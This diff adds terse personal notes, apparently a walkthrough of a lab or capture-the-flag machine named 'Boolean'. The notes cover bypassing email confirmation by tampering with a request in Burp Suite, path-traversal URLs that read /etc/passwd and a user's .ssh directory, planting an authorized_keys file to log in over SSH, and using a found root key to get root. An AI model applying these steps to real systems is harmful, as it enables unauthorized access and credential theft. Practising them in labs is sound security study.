@@ -1,0 +1,36 @@
+Boolean 
+
+192.168.221.231
+http://192.168.221.231/login
+login screen 
+I tried somelogin but failed so decided to create new account
+followed
+what the hell I need to confirm email
+I decided to capture the data using burpsuite
+
+Captured the data and manipulated & email got confirmed
+
+Now I am happy to see that I can upload the file 
+SO i created 2 files .txt and .php
+uploaded
+
+But no luck to execute file
+
+tried LFI 
+http://192.168.221.231/?cwd=../../../../../etc&file=passwd&download=true
+Found username 
+rmi
+
+http://192.168.221.231/?cwd=../../../../../home/remi/.ssh/keys
+http://192.168.221.231/?cwd=../../../../../home/remi/.ssh
+ssh-keygen
+cp /home/vijay/.ssh/id_ed25519.pub authorized_keys
+upload authorized keys into 
+http://192.168.221.231/?cwd=../../../../../home/remi/.ssh
+ssh -i /home/vijay/.ssh/id_ed25519 remi@192.168.221.231
+
+cd .ssh/keys
+ssh -i root root@127.0.0.1
+got root access 
+
+http://192.168.221.231/?cwd=../../../../../home/remi/.ssh&file=authorized_keys&download=true
